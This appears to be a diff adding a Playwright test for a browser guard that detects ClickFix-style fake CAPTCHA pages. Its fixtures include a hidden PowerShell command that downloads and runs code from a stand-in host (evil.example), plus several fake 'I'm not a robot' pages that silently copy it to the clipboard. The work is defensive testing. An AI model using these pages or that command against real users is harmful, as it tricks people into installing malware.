@@ -6,6 +6,7 @@
 """
 from __future__ import annotations
 
+import html
 import importlib.util
 import json
 import sys
@@ -67,6 +68,58 @@ def test_guard_in_browser():
     assert results["quiz"] == (False, 3), results                          # 数回のダイアログは止めない
 
 
+# ClickFix: 偽の「ロボットではありません」。ボタンで隠れたコマンドをコピーさせ、Win+R で貼り付けさせる
+CMD = 'powershell -w h -c "iex(irm https://evil.example/x)" # I am not a robot - Verification ID: 4821'
+CMDJS = f"<script>var CMD = {json.dumps(CMD)};</script>"
+CLICKFIX = {
+    "writeText": CMDJS + f"""<h2>Verify you are human</h2><p>Press Win + R, then Ctrl + V and Enter.</p>
+<button id="b" onclick="navigator.clipboard.writeText(CMD)">I'm not a robot</button>""",
+    "execCommand": f"""<h2>ロボットではありません</h2><p>Windows キー + R を押して貼り付けてください</p>
+<textarea id="t" style="position:absolute;left:-9999px">{html.escape(CMD)}</textarea>
+<button id="b" onclick="var t=document.getElementById('t');t.focus();t.select();document.execCommand('copy')">確認</button>""",
+    "setData": CMDJS + """<p>Verification step</p><button id="b" onclick="document.execCommand('copy')">Copy</button>
+<script>document.addEventListener('copy', function (e) { e.clipboardData.setData('text/plain', CMD); e.preventDefault(); });</script>""",
+    "write": CMDJS + """<p>Please complete the CAPTCHA</p><button id="b" onclick="navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD], {type: 'text/plain'})})])">OK</button>""",
+}
+# 技術文書の「コピー」ボタン（コマンドがページに表示されている）は止めない
+DOCS_CMD = "powershell -Command Get-Process | Sort-Object CPU"
+DOCS = f"""<h2>How to list processes</h2><pre><code>{DOCS_CMD}</code></pre>
+<button id="b" onclick="navigator.clipboard.writeText({DOCS_CMD!r})">Copy</button>"""
+PLAIN = """<p>Share this link</p><button id="b" onclick="navigator.clipboard.writeText('https://example.com/article/123')">Copy link</button>"""
+
+
+def test_clickfix_in_browser():
+    if importlib.util.find_spec("playwright") is None:
+        print("skip: playwright not installed")
+        return
+    from playwright.sync_api import sync_playwright
+    results = {}
+    with sync_playwright() as p:
+        browser = p.chromium.launch()
+        cases = dict(CLICKFIX, docs=DOCS, plain=PLAIN)
+        for name, body in cases.items():
+            ctx = browser.new_context(permissions=["clipboard-read", "clipboard-write"])
+            pg = ctx.new_page()
+            html = page(body)
+            pg.route("**/*", lambda route, _r, html=html: route.fulfill(status=200, content_type="text/html", body=html)
+                     if route.request.url.startswith("https://guard.test/") else route.abort())
+            pg.goto("https://guard.test/")
+            pg.evaluate("navigator.clipboard.writeText('before')")
+            pg.click("#b")
+            pg.wait_for_timeout(500)
+            results[name] = (pg.evaluate("!!document.querySelector('shoji-guard')"),
+                             pg.evaluate("navigator.clipboard.readText()"))
+            ctx.close()
+        browser.close()
+    for name in CLICKFIX:
+        warned, clip = results[name]
+        assert warned and "powershell" not in clip and clip.startswith("Shoji"), (name, results[name])
+    assert results["docs"] == (False, DOCS_CMD), results
+    assert results["plain"] == (False, "https://example.com/article/123"), results
+
+
 if __name__ == "__main__":
     test_guard_in_browser()
     print("OK test_guard_in_browser")
+    test_clickfix_in_browser()
+    print("OK test_clickfix_in_browser")
